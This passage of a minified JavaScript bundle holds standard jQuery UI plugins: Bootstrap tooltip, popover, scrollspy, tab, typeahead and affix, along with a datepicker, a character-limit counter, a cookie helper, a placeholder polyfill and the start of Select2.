this.$tip=this.$tip||t(this.options.template)},arrow:function(){return this.$arrow=this.$arrow||this.tip().find(".tooltip-arrow")},validate:function(){this.$element[0].parentNode||(this.hide(),this.$element=null,this.options=null)},enable:function(){this.enabled=!0},disable:function(){this.enabled=!1},toggleEnabled:function(){this.enabled=!this.enabled},toggle:function(e){var i=e?t(e.currentTarget)[this.type](this._options).data(this.type):this;i.tip().hasClass("in")?i.hide():i.show()},destroy:function(){this.hide().$element.off("."+this.type).removeData(this.type)}};var i=t.fn.tooltip;t.fn.tooltip=function(i){return this.each((function(){var a=t(this),o=a.data("tooltip"),n="object"==typeof i&&i;o||a.data("tooltip",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.tooltip.Constructor=e,t.fn.tooltip.defaults={animation:!0,placement:"top",selector:!1,template:'<div class="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',trigger:"hover focus",title:"",delay:0,html:!1,container:!1},t.fn.tooltip.noConflict=function(){return t.fn.tooltip=i,this}}(window.jQuery),function(t){"use strict";var e=function(t,e){this.init("popover",t,e)};e.prototype=t.extend({},t.fn.tooltip.Constructor.prototype,{constructor:e,setContent:function(){var t=this.tip(),e=this.getTitle(),i=this.getContent();t.find(".popover-title")[this.options.html?"html":"text"](e),t.find(".popover-content")[this.options.html?"html":"text"](i),t.removeClass("fade top bottom left right in")},hasContent:function(){return this.getTitle()||this.getContent()},getContent:function(){var t=this.$element,e=this.options;return("function"==typeof e.content?e.content.call(t[0]):e.content)||t.attr("data-content")},tip:function(){return this.$tip||(this.$tip=t(this.options.template)),this.$tip},destroy:function(){this.hide().$element.off("."+this.type).removeData(this.type)}});var i=t.fn.popover;t.fn.popover=function(i){return this.each((function(){var a=t(this),o=a.data("popover"),n="object"==typeof i&&i;o||a.data("popover",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.popover.Constructor=e,t.fn.popover.defaults=t.extend({},t.fn.tooltip.defaults,{placement:"right",trigger:"click",content:"",template:'<div class="popover"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'}),t.fn.popover.noConflict=function(){return t.fn.popover=i,this}}(window.jQuery),function(t){"use strict";function e(e,i){var a,o=t.proxy(this.process,this),n=t(e).is("body")?t(window):t(e);this.options=t.extend({},t.fn.scrollspy.defaults,i),this.$scrollElement=n.on("scroll.scroll-spy.data-api",o),this.selector=(this.options.target||(a=t(e).attr("href"))&&a.replace(/.*(?=#[^\s]+$)/,"")||"")+" .nav li > a",this.$body=t("body"),this.refresh(),this.process()}e.prototype={constructor:e,refresh:function(){var e=this;this.offsets=t([]),this.targets=t([]),this.$body.find(this.selector).map((function(){var i=t(this),a=i.data("target")||i.attr("href"),o=/^#\w/.test(a)&&t(a);return o&&o.length&&[[o.position().top+(!t.isWindow(e.$scrollElement.get(0))&&e.$scrollElement.scrollTop()),a]]||null})).sort((function(t,e){return t[0]-e[0]})).each((function(){e.offsets.push(this[0]),e.targets.push(this[1])}))},process:function(){var t,e=this.$scrollElement.scrollTop()+this.options.offset,i=(this.$scrollElement[0].scrollHeight||this.$body[0].scrollHeight)-this.$scrollElement.height(),a=this.offsets,o=this.targets,n=this.activeTarget;if(e>=i)return n!=(t=o.last()[0])&&this.activate(t);for(t=a.length;t--;)n!=o[t]&&e>=a[t]&&(!a[t+1]||e<=a[t+1])&&this.activate(o[t])},activate:function(e){var i,a;this.activeTarget=e,t(this.selector).parent(".active").removeClass("active"),a=this.selector+'[data-target="'+e+'"],'+this.selector+'[href="'+e+'"]',(i=t(a).parent("li").addClass("active")).parent(".dropdown-menu").length&&(i=i.closest("li.dropdown").addClass("active")),i.trigger("activate")}};var i=t.fn.scrollspy;t.fn.scrollspy=function(i){return this.each((function(){var a=t(this),o=a.data("scrollspy"),n="object"==typeof i&&i;o||a.data("scrollspy",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.scrollspy.Constructor=e,t.fn.scrollspy.defaults={offset:10},t.fn.scrollspy.noConflict=function(){return t.fn.scrollspy=i,this},t(window).on("load",(function(){t('[data-spy="scroll"]').each((function(){var e=t(this);e.scrollspy(e.data())}))}))}(window.jQuery),function(t){"use strict";var e=function(e){this.element=t(e)};e.prototype={constructor:e,show:function(){var e,i,a,o=this.element,n=o.closest("ul:not(.dropdown-menu)"),r=o.attr("data-target");r||(r=(r=o.attr("href"))&&r.replace(/.*(?=#[^\s]*$)/,"")),o.parent("li").hasClass("active")||(e=n.find(".active:last a")[0],a=t.Event("show",{relatedTarget:e}),o.trigger(a),a.isDefaultPrevented()||(i=t(r),this.activate(o.parent("li"),n),this.activate(i,i.parent(),(function(){o.trigger({type:"shown",relatedTarget:e})}))))},activate:function(e,i,a){function o(){n.removeClass("active").find("> .dropdown-menu > .active").removeClass("active"),e.addClass("active"),r?(e[0].offsetWidth,e.addClass("in")):e.removeClass("fade"),e.parent(".dropdown-menu")&&e.closest("li.dropdown").addClass("active"),a&&a()}var n=i.find("> .active"),r=a&&t.support.transition&&n.hasClass("fade");r?n.one(t.support.transition.end,o):o(),n.removeClass("in")}};var i=t.fn.tab;t.fn.tab=function(i){return this.each((function(){var a=t(this),o=a.data("tab");o||a.data("tab",o=new e(this)),"string"==typeof i&&o[i]()}))},t.fn.tab.Constructor=e,t.fn.tab.noConflict=function(){return t.fn.tab=i,this},t(document).on("click.tab.data-api",'[data-toggle="tab"], [data-toggle="pill"]',(function(e){e.preventDefault(),t(this).tab("show")}))}(window.jQuery),function(t){"use strict";var e=function(e,i){this.$element=t(e),this.options=t.extend({},t.fn.typeahead.defaults,i),this.matcher=this.options.matcher||this.matcher,this.sorter=this.options.sorter||this.sorter,this.highlighter=this.options.highlighter||this.highlighter,this.updater=this.options.updater||this.updater,this.source=this.options.source,this.$menu=t(this.options.menu),this.shown=!1,this.listen()};e.prototype={constructor:e,select:function(){var t=this.$menu.find(".active").attr("data-value");return this.$element.val(this.updater(t)).change(),this.hide()},updater:function(t){return t},show:function(){var e=t.extend({},this.$element.position(),{height:this.$element[0].offsetHeight});return this.$menu.insertAfter(this.$element).css({top:e.top+e.height,left:e.left}).show(),this.shown=!0,this},hide:function(){return this.$menu.hide(),this.shown=!1,this},lookup:function(e){var i;return this.query=this.$element.val(),!this.query||this.query.length<this.options.minLength?this.shown?this.hide():this:(i=t.isFunction(this.source)?this.source(this.query,t.proxy(this.process,this)):this.source)?this.process(i):this},process:function(e){var i=this;return e=t.grep(e,(function(t){return i.matcher(t)})),(e=this.sorter(e)).length?this.render(e.slice(0,this.options.items)).show():this.shown?this.hide():this},matcher:function(t){return~t.toLowerCase().indexOf(this.query.toLowerCase())},sorter:function(t){for(var e,i=[],a=[],o=[];e=t.shift();)e.toLowerCase().indexOf(this.query.toLowerCase())?~e.indexOf(this.query)?a.push(e):o.push(e):i.push(e);return i.concat(a,o)},highlighter:function(t){var e=this.query.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&");return t.replace(new RegExp("("+e+")","ig"),(function(t,e){return"<strong>"+e+"</strong>"}))},render:function(e){var i=this;return(e=t(e).map((function(e,a){return(e=t(i.options.item).attr("data-value",a)).find("a").html(i.highlighter(a)),e[0]}))).first().addClass("active"),this.$menu.html(e),this},next:function(e){var i=this.$menu.find(".active").removeClass("active").next();i.length||(i=t(this.$menu.find("li")[0])),i.addClass("active")},prev:function(t){var e=this.$menu.find(".active").removeClass("active").prev();e.length||(e=this.$menu.find("li").last()),e.addClass("active")},listen:function(){this.$element.on("focus",t.proxy(this.focus,this)).on("blur",t.proxy(this.blur,this)).on("keypress",t.proxy(this.keypress,this)).on("keyup",t.proxy(this.keyup,this)),this.eventSupported("keydown")&&this.$element.on("keydown",t.proxy(this.keydown,this)),this.$menu.on("click",t.proxy(this.click,this)).on("mouseenter","li",t.proxy(this.mouseenter,this)).on("mouseleave","li",t.proxy(this.mouseleave,this))},eventSupported:function(t){var e=t in this.$element;return e||(this.$element.setAttribute(t,"return;"),e="function"==typeof this.$element[t]),e},move:function(t){if(this.shown){switch(t.keyCode){case 9:case 13:case 27:t.preventDefault();break;case 38:t.preventDefault(),this.prev();break;case 40:t.preventDefault(),this.next()}t.stopPropagation()}},keydown:function(e){this.suppressKeyPressRepeat=~t.inArray(e.keyCode,[40,38,9,13,27]),this.move(e)},keypress:function(t){this.suppressKeyPressRepeat||this.move(t)},keyup:function(t){switch(t.keyCode){case 40:case 38:case 16:case 17:case 18:break;case 9:case 13:if(!this.shown)return;this.select();break;case 27:if(!this.shown)return;this.hide();break;default:this.lookup()}t.stopPropagation(),t.preventDefault()},focus:function(t){this.focused=!0},blur:function(t){this.focused=!1,!this.mousedover&&this.shown&&this.hide()},click:function(t){t.stopPropagation(),t.preventDefault(),this.select(),this.$element.focus()},mouseenter:function(e){this.mousedover=!0,this.$menu.find(".active").removeClass("active"),t(e.currentTarget).addClass("active")},mouseleave:function(t){this.mousedover=!1,!this.focused&&this.shown&&this.hide()}};var i=t.fn.typeahead;t.fn.typeahead=function(i){return this.each((function(){var a=t(this),o=a.data("typeahead"),n="object"==typeof i&&i;o||a.data("typeahead",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.typeahead.defaults={source:[],items:8,menu:'<ul class="typeahead dropdown-menu"></ul>',item:'<li><a href="#"></a></li>',minLength:1},t.fn.typeahead.Constructor=e,t.fn.typeahead.noConflict=function(){return t.fn.typeahead=i,this},t(document).on("focus.typeahead.data-api",'[data-provide="typeahead"]',(function(e){var i=t(this);i.data("typeahead")||i.typeahead(i.data())}))}(window.jQuery),function(t){"use strict";var e=function(e,i){this.options=t.extend({},t.fn.affix.defaults,i),this.$window=t(window).on("scroll.affix.data-api",t.proxy(this.checkPosition,this)).on("click.affix.data-api",t.proxy((function(){setTimeout(t.proxy(this.checkPosition,this),1)}),this)),this.$element=t(e),this.checkPosition()};e.prototype.checkPosition=function(){if(this.$element.is(":visible")){var e,i=t(document).height(),a=this.$window.scrollTop(),o=this.$element.offset(),n=this.options.offset,r=n.bottom,s=n.top;"object"!=typeof n&&(r=s=n),"function"==typeof s&&(s=n.top()),"function"==typeof r&&(r=n.bottom()),e=!(null!=this.unpin&&a+this.unpin<=o.top)&&(null!=r&&o.top+this.$element.height()>=i-r?"bottom":null!=s&&a<=s&&"top"),this.affixed!==e&&(this.affixed=e,this.unpin="bottom"==e?o.top-a:null,this.$element.removeClass("affix affix-top affix-bottom").addClass("affix"+(e?"-"+e:"")))}};var i=t.fn.affix;t.fn.affix=function(i){return this.each((function(){var a=t(this),o=a.data("affix"),n="object"==typeof i&&i;o||a.data("affix",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.affix.Constructor=e,t.fn.affix.defaults={offset:0},t.fn.affix.noConflict=function(){return t.fn.affix=i,this},t(window).on("load",(function(){t('[data-spy="affix"]').each((function(){var e=t(this),i=e.data();i.offset=i.offset||{},i.offsetBottom&&(i.offset.bottom=i.offsetBottom),i.offsetTop&&(i.offset.top=i.offsetTop),e.affix(i)}))}))}(window.jQuery),function(t){var e=function(e,a){if(this.element=t(e),this.format=i.parseFormat(a.format||this.element.data("date-format")||"mm/dd/yyyy"),this.picker=t(i.template).appendTo("body").on({click:t.proxy(this.click,this)}),this.isInput=this.element.is("input"),this.component=!!this.element.is(".date")&&this.element.find(".add-on"),this.isInput?this.element.on({focus:t.proxy(this.show,this),keyup:t.proxy(this.update,this)}):this.component?this.component.on("click",t.proxy(this.show,this)):this.element.on("click",t.proxy(this.show,this)),this.minViewMode=a.minViewMode||this.element.data("date-minviewmode")||0,"string"==typeof this.minViewMode)switch(this.minViewMode){case"months":this.minViewMode=1;break;case"years":this.minViewMode=2;break;default:this.minViewMode=0}if(this.viewMode=a.viewMode||this.element.data("date-viewmode")||0,"string"==typeof this.viewMode)switch(this.viewMode){case"months":this.viewMode=1;break;case"years":this.viewMode=2;break;default:this.viewMode=0}this.startViewMode=this.viewMode,this.weekStart=a.weekStart||this.element.data("date-weekstart")||0,this.weekEnd=0===this.weekStart?6:this.weekStart-1,this.onRender=a.onRender,this.fillDow(),this.fillMonths(),this.update(),this.showMode()};e.prototype={constructor:e,show:function(e){this.picker.show(),this.height=this.component?this.component.outerHeight():this.element.outerHeight(),this.place(),t(window).on("resize",t.proxy(this.place,this)),e&&(e.stopPropagation(),e.preventDefault()),this.isInput;var i=this;t(document).on("mousedown",(function(e){0==t(e.target).closest(".dtpicker").length&&i.hide()})),this.element.trigger({type:"show",date:this.date})},hide:function(){this.picker.hide(),t(window).off("resize",this.place),this.viewMode=this.startViewMode,this.showMode(),this.isInput||t(document).off("mousedown",this.hide),this.element.trigger({type:"hide",date:this.date})},set:function(){var t=i.formatDate(this.date,this.format);this.isInput?this.element.prop("value",t):(this.component&&this.element.find("input").prop("value",t),this.element.data("date",t))},setValue:function(t){this.date="string"==typeof t?i.parseDate(t,this.format):new Date(t),this.set(),this.viewDate=new Date(this.date.getFullYear(),this.date.getMonth(),1,0,0,0,0),this.fill()},place:function(){var t=this.component?this.component.offset():this.element.offset();this.picker.css({top:t.top+this.height,left:t.left})},update:function(t){this.date=i.parseDate("string"==typeof t?t:this.isInput?this.element.prop("value"):this.element.data("date"),this.format),this.viewDate=new Date(this.date.getFullYear(),this.date.getMonth(),1,0,0,0,0),this.fill()},fillDow:function(){for(var t=this.weekStart,e="<tr>";t<this.weekStart+7;)e+='<th class="dow">'+i.dates.daysMin[t++%7]+"</th>";e+="</tr>",this.picker.find(".dtpicker-days thead").append(e)},fillMonths:function(){for(var t="",e=0;e<12;)t+='<span class="month">'+i.dates.monthsShort[e++]+"</span>";this.picker.find(".dtpicker-months td").append(t)},fill:function(){var t=new Date(this.viewDate),e=t.getFullYear(),a=t.getMonth(),o=this.date.valueOf();this.picker.find(".dtpicker-days th:eq(1)").text(i.dates.months[a]+" "+e);var n=new Date(e,a-1,28,0,0,0,0),r=i.getDaysInMonth(n.getFullYear(),n.getMonth());n.setDate(r),n.setDate(r-(n.getDay()-this.weekStart+7)%7);var s=new Date(n);s.setDate(s.getDate()+42),s=s.valueOf();for(var l,c,d,p=[];n.valueOf()<s;)n.getDay()===this.weekStart&&p.push("<tr>"),l=this.onRender(n),c=n.getFullYear(),(d=n.getMonth())<a&&c===e||c<e?l+=" old":(d>a&&c===e||c>e)&&(l+=" new"),n.valueOf()===o&&(l+=" active"),p.push('<td class="day '+l+'">'+n.getDate()+"</td>"),n.getDay()===this.weekEnd&&p.push("</tr>"),n.setDate(n.getDate()+1);this.picker.find(".dtpicker-days tbody").empty().append(p.join(""));var u=this.date.getFullYear(),h=this.picker.find(".dtpicker-months").find("th:eq(1)").text(e).end().find("span").removeClass("active");u===e&&h.eq(this.date.getMonth()).addClass("active"),p="",e=10*parseInt(e/10,10);var f=this.picker.find(".dtpicker-years").find("th:eq(1)").text(e+"-"+(e+9)).end().find("td");e-=1;for(var m=-1;m<11;m++)p+='<span class="year'+(-1===m||10===m?" old":"")+(u===e?" active":"")+'">'+e+"</span>",e+=1;f.html(p)},click:function(e){e.stopPropagation(),e.preventDefault();var a=t(e.target).closest("span, td, th");if(1===a.length)switch(a[0].nodeName.toLowerCase()){case"th":switch(a[0].className){case"switch":this.showMode(1);break;case"prev":case"next":this.viewDate["set"+i.modes[this.viewMode].navFnc].call(this.viewDate,this.viewDate["get"+i.modes[this.viewMode].navFnc].call(this.viewDate)+i.modes[this.viewMode].navStep*("prev"===a[0].className?-1:1)),this.fill(),this.set()}break;case"span":if(a.is(".month")){var o=a.parent().find("span").index(a);this.viewDate.setMonth(o)}else{var n=parseInt(a.text(),10)||0;this.viewDate.setFullYear(n)}0!==this.viewMode&&(this.date=new Date(this.viewDate),this.element.trigger({type:"changeDate",date:this.date,viewMode:i.modes[this.viewMode].clsName})),this.showMode(-1),this.fill(),this.set();break;case"td":if(a.is(".day")&&!a.is(".disabled")){var r=parseInt(a.text(),10)||1;o=this.viewDate.getMonth();a.is(".old")?o-=1:a.is(".new")&&(o+=1);n=this.viewDate.getFullYear();this.date=new Date(n,o,r,0,0,0,0),this.viewDate=new Date(n,o,Math.min(28,r),0,0,0,0),this.fill(),this.set(),this.element.trigger({type:"changeDate",date:this.date,viewMode:i.modes[this.viewMode].clsName})}}},mousedown:function(t){t.stopPropagation(),t.preventDefault()},showMode:function(t){t&&(this.viewMode=Math.max(this.minViewMode,Math.min(2,this.viewMode+t))),this.picker.find(">div").hide().filter(".dtpicker-"+i.modes[this.viewMode].clsName).show()}},t.fn.dtpicker=function(i,a){return this.each((function(){var o=t(this),n=o.data("dtpicker"),r="object"==typeof i&&i;n||o.data("dtpicker",n=new e(this,t.extend({},t.fn.dtpicker.defaults,r))),"string"==typeof i&&n[i](a)}))},t.fn.dtpicker.defaults={onRender:function(t){return""}},t.fn.dtpicker.Constructor=e;var i={modes:[{clsName:"days",navFnc:"Month",navStep:1},{clsName:"months",navFnc:"FullYear",navStep:1},{clsName:"years",navFnc:"FullYear",navStep:10}],dates:{days:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday"],daysShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat","Sun"],daysMin:["Su","Mo","Tu","We","Th","Fr","Sa","Su"],months:["January","February","March","April","May","June","July","August","September","October","November","December"],monthsShort:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]},isLeapYear:function(t){return t%4==0&&t%100!=0||t%400==0},getDaysInMonth:function(t,e){return[31,i.isLeapYear(t)?29:28,31,30,31,30,31,31,30,31,30,31][e]},parseFormat:function(t){var e=t.match(/[.\/\-\s].*?/),i=t.split(/\W+/);if(!e||!i||0===i.length)throw new Error("Invalid date format.");return{separator:e,parts:i}},parseDate:function(t,e){var i,a=t.split(e.separator);if((t=new Date).setHours(0),t.setMinutes(0),t.setSeconds(0),t.setMilliseconds(0),a.length===e.parts.length){for(var o=t.getFullYear(),n=t.getDate(),r=t.getMonth(),s=0,l=e.parts.length;s<l;s++)switch(i=parseInt(a[s],10)||1,e.parts[s]){case"dd":case"d":n=i,t.setDate(i);break;case"mm":case"m":r=i-1,t.setMonth(i-1);break;case"yy":o=2e3+i,t.setFullYear(2e3+i);break;case"yyyy":o=i,t.setFullYear(i)}t=new Date(o,r,n,0,0,0)}return t},formatDate:function(t,e){var i={d:t.getDate(),m:t.getMonth()+1,yy:t.getFullYear().toString().substring(2),yyyy:t.getFullYear()};i.dd=(i.d<10?"0":"")+i.d,i.mm=(i.m<10?"0":"")+i.m;t=[];for(var a=0,o=e.parts.length;a<o;a++)t.push(i[e.parts[a]]);return t.join(e.separator)},headTemplate:'<thead><tr><th class="prev">&lsaquo;</th><th colspan="5" class="switch"></th><th class="next">&rsaquo;</th></tr></thead>',contTemplate:'<tbody><tr><td colspan="7"></td></tr></tbody>'};i.template='<div class="dtpicker dropdown-menu"><div class="dtpicker-days"><table class=" table-condensed">'+i.headTemplate+'<tbody></tbody></table></div><div class="dtpicker-months"><table class="table-condensed">'+i.headTemplate+i.contTemplate+'</table></div><div class="dtpicker-years"><table class="table-condensed">'+i.headTemplate+i.contTemplate+"</table></div></div>"}(window.jQuery),function(t){"use strict";var e=function(e,i){this.$element=t(e),this.options=t.extend({},t.fn.limit.defaults,i),this.maxChars=this.options.maxchars||this.maxChars,this.counter=t(this.options.counter)||this.counter,this.listen(),this.check()};e.prototype={constructor:e,listen:function(){this.$element.on("keypress",t.proxy(this.keypress,this)).on("keyup",t.proxy(this.keyup,this)).on("focus",t.proxy(this.focus,this)),(jQBrowser.webkit||jQBrowser.msie)&&this.$element.on("keydown",t.proxy(this.keypress,this))},check:function(){this.query=this.$element.val(),this.query||(this.counter.text(this.maxChars),this.counter.css("color","red"),this.$element.trigger("uncross")),this.counter.text(this.maxChars-this.query.length),this.query.length>this.maxChars?(this.counter.css("color","red"),this.$element.trigger("cross")):this.query.length>this.maxChars-10?(this.counter.css("color","red"),this.$element.trigger("uncross")):(this.counter.css("color",""),this.$element.trigger("uncross"))},keyup:function(t){this.check(),t.stopPropagation(),t.preventDefault()},keypress:function(t){this.check(),t.stopPropagation()},focus:function(t){this.check()}},t.fn.limit=function(i){return this.each((function(){var a=t(this),o=a.data("limit"),n="object"==typeof i&&i;o||a.data("limit",o=new e(this,n)),"string"==typeof i&&o[i]()}))},t.fn.limit.defaults={maxChars:140,counter:""},t.fn.limit.Constructor=e,t((function(){t("body").on("focus.limit.data-api",'[data-provide="limit"]',(function(e){var i=t(this);i.data("limit")||i.limit(i.data())}))}))}(window.jQuery),jQuery.cookie=function(t,e,i){if(void 0===e){var a=null;if(document.cookie&&""!=document.cookie)for(var o=document.cookie.split(";"),n=0;n<o.length;n++){var r=jQuery.trim(o[n]);if(r.substring(0,t.length+1)==t+"="){a=decodeURIComponent(r.substring(t.length+1));break}}return a}i=i||{},null===e&&(e="",(i=$.extend({},i)).expires=-1);var s,l="";i.expires&&("number"==typeof i.expires||i.expires.toUTCString)&&("number"==typeof i.expires?(s=new Date).setTime(s.getTime()+24*i.expires*60*60*1e3):s=i.expires,l="; expires="+s.toUTCString());var c=i.path?"; path="+i.path:"",d=i.domain?"; domain="+i.domain:"",p=i.secure?"; secure":"";document.cookie=[t,"=",encodeURIComponent(e),l,c,d,p].join("")},function(t,e,i){var a,o,n="placeholder"in e.createElement("input"),r="placeholder"in e.createElement("textarea"),s=i.fn,l=i.valHooks;function c(t,a){var o=this,n=i(o);if(o.value==n.attr("placeholder")&&n.hasClass("placeholder"))if(n.data("placeholder-password")){if(n=n.hide().next().show().attr("id",n.removeAttr("id").data("placeholder-id")),!0===t)return n[0].value=a;n.focus()}else o.value="",n.removeClass("placeholder"),o==e.activeElement&&o.select()}function d(){var t,e,a,o,n=this,r=i(n),s=this.id;if(""==n.value){if("password"==n.type){if(!r.data("placeholder-textinput")){try{t=r.clone().attr({type:"text"})}catch(n){t=i("<input>").attr(i.extend((e=this,a={},o=/^jQuery\d+$/,i.each(e.attributes,(function(t,e){e.specified&&!o.test(e.name)&&(a[e.name]=e.value)})),a),{type:"text"}))}t.removeAttr("name").data({"placeholder-password":!0,"placeholder-id":s}).bind("focus.placeholder",c),r.data({"placeholder-textinput":t,"placeholder-id":s}).before(t)}r=r.removeAttr("id").hide().prev().attr("id",s).show()}r.addClass("placeholder"),r[0].value=r.attr("placeholder")}else r.removeClass("placeholder")}n&&r?(o=s.placeholder=function(){return this}).input=o.textarea=!0:((o=s.placeholder=function(){return this.filter((n?"textarea":":input")+"[placeholder]").not(".placeholder").bind({"focus.placeholder":c,"blur.placeholder":d}).data("placeholder-enabled",!0).trigger("blur.placeholder"),this}).input=n,o.textarea=r,a={get:function(t){var e=i(t);return e.data("placeholder-enabled")&&e.hasClass("placeholder")?"":t.value},set:function(t,a){var o=i(t);return o.data("placeholder-enabled")?(""==a?(t.value=a,t!=e.activeElement&&d.call(t)):o.hasClass("placeholder")&&c.call(t,!0,a)||(t.value=a),o):t.value=a}},n||(l.input=a),r||(l.textarea=a),i((function(){i(e).delegate("form","submit.placeholder",(function(){var t=i(".placeholder",this).each(c);setTimeout((function(){t.each(d)}),10)}))})),i(t).bind("beforeunload.placeholder",(function(){i(".placeholder").each((function(){this.value=""}))})))}(this,document,jQuery),function(t){void 0===t.fn.each2&&t.extend(t.fn,{each2:function(e){for(var i=t([0]),a=-1,o=this.length;++a<o&&(i.context=i[0]=this[a])&&!1!==e.call(i[0],a,i););return this}})}(jQuery),function(t,e){"use strict";function i(t){var e,i,a,o;if(!t||t.length<1)return t;for(e="",i=0,a=t.length;a>i;i++)o=t.charAt(i),e+=M[o]||o;return e}function a(t,e){for(var i=0,a=e.length;a>i;i+=1)if(o(t,e[i]))return i;return-1}function o(t,i){return t===i||t!==e&&i!==e&&(null!==t&&null!==i&&(t.constructor===String?t+""==i+"":i.constructor===String&&i+""==t+""))}function n(e,i){var a,o,n;if(null===e||e.length<1)return[];for(o=0,n=(a=e.split(i)).length;n>o;o+=1)a[o]=t.trim(a[o]);return a}function r(t){return t.outerWidth(!1)-t.width()}function s(i){var a="keyup-change-value";i.on("keydown",(function(){t.data(i,a)===e&&t.data(i,a,i.val())})),i.on("keyup",(function(){var o=t.data(i,a);o!==e&&i.val()!==o&&(t.removeData(i,a),i.trigger("keyup-change"))}))}function l(i){i.on("mousemove",(function(i){var a=A;(a===e||a.x!==i.pageX||a.y!==i.pageY)&&t(i.target).trigger("mousemove-filtered",i)}))}function c(t,i,a){var o;return a=a||e,function(){var e=arguments;window.clearTimeout(o),o=window.setTimeout((function(){i.apply(a,e)}),t)}}function d(e){var i=0,a=0;if("selectionStart"in(e=t(e)[0]))i=e.selectionStart,a=e.selectionEnd-i;else if("selection"in document){e.focus();var o=document.selection.createRange();a=document.selection.createRange().text.length,o.moveStart("character",-e.value.length),i=o.text.length-a}return{offset:i,length:a}}function p(t){t.preventDefault(),t.stopPropagation()}function u(e){if(!_){var i=e[0].currentStyle||window.getComputedStyle(e[0],null);(_=t(document.createElement("div")).css({position:"absolute",left:"-10000px",top:"-10000px",display:"none",fontSize:i.fontSize,fontFamily:i.fontFamily,fontStyle:i.fontStyle,fontWeight:i.fontWeight,letterSpacing:i.letterSpacing,textTransform:i.textTransform,whiteSpace:"nowrap"})).attr("class","select2-sizer"),t("body").append(_)}return _.text(e.val()),_.width()}function h(e,i,a){var o,n,r=[];(o=e.attr("class"))&&t((o=""+o).split(" ")).each2((function(){0===this.indexOf("select2-")&&r.push(this)})),(o=i.attr("class"))&&t((o=""+o).split(" ")).each2((function(){0!==this.indexOf("select2-")&&((n=a(this))&&r.push(n))})),e.attr("class",r.join(" "))}function f(t,e,a,o){var n=i(t.toUpperCase()).indexOf(i(e.toUpperCase())),r=e.length;return 0>n?void a.push(o(t)):(a.push(o(t.substring(0,n))),a.push("<span class='select2-match'>"),a.push(o(t.substring(n,n+r))),a.push("</span>"),void a.push(o(t.substring(n+r,t.length))))}function m(t){var e={"\\":"&#92;","&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","/":"&#47;"};return String(t).replace(/[&<>"'\/\\]/g,(function(t){return e[t]}))}function g(i){var a,o=null,n=i.quietMillis||100,r=i.url,s=this;return function(l){window.clearTimeout(a),a=window.setTimeout((function(){var a=i.data,n=r,c=i.transport||t.fn.select2.ajaxDefaults.transport,d={type:i.type||"GET",cache:i.cache||!1,jsonpCallback:i.jsonpCallback||e,dataType:i.dataType||"json"},p=t.extend({},t.fn.select2.ajaxDefaults.params,d);a=a?a.call(s,l.term,l.page,l.context):null,n="function"==typeof n?n.call(s,l.term,l.page,l.context):n,o&&o.abort(),i.params&&(t.isFunction(i.params)?t.extend(p,i.params.call(s)):t.extend(p,i.params)),t.extend(p,{url:n,dataType:i.dataType,data:a,success:function(t){var e=i.results(t,l.page);l.callback(e)}}),o=c.call(s,p)}),n)}}function v(e){var i,a,o=e,n=function(t){return""+t.text};t.isArray(o)&&(o={results:a=o}),!1===t.isFunction(o)&&(a=o,o=function(){return a});var r=o();return r.text&&(n=r.text,t.isFunction(n)||(i=r.text,n=function(t){return t[i]})),function(e){var i,a=e.term,r={results:[]};return""===a?void e.callback(o()):(i=function(o,r){var s,l;if((o=o[0]).children){for(l in s={},o)o.hasOwnProperty(l)&&(s[l]=o[l]);s.children=[],t(o.children).each2((function(t,e){i(e,s.children)})),(s.children.length||e.matcher(a,n(s),o))&&r.push(s)}else e.matcher(a,n(o),o)&&r.push(o)},t(o().results).each2((function(t,e){i(e,r.results)})),void e.callback(r))}}function y(i){var a=t.isFunction(i);return function(o){var n=o.term,r={results:[]};t(a?i():i).each((function(){var t=this.text!==e,i=t?this.text:this;(""===n||o.matcher(n,i))&&r.results.push(t?this:{id:this,text:this})})),o.callback(r)}}function $(e,i){if(t.isFunction(e))return!0;if(!e)return!1;throw new Error(i+" must be a function or a falsy value")}function b(e){return t.isFunction(e)?e():e}function w(e){var i=0;return t.each(e,(function(t,e){e.children?i+=w(e.children):i++})),i}function x(e,i){var a=function(){};return(a.prototype=new e).constructor=a,a.prototype.parent=e.prototype,a.prototype=t.extend(a.prototype,i),a}if(window.Select2===e){var C,k,S,T,_,E,D,A={x:0,y:0},F={TAB:9,ENTER:13,ESC:27,SPACE:32,LEFT:37,UP:38,RIGHT:39,DOWN:40,SHIFT:16,CTRL:17,ALT:18,PAGE_UP:33,PAGE_DOWN:34,HOME:36,END:35,BACKSPACE:8,DELETE:46,isArrow:function(t){switch(t=t.which?t.which:t){case F.LEFT:case F.RIGHT:case F.UP:case F.DOWN:return!0}return!1},isControl:function(t){switch(t.which){case F.SHIFT:case F.CTRL:case F.ALT:return!0}return!!t.metaKey},isFunctionKey:function(t){return(t=t.which?t.which:t)>=112&&123>=t}},O="<div 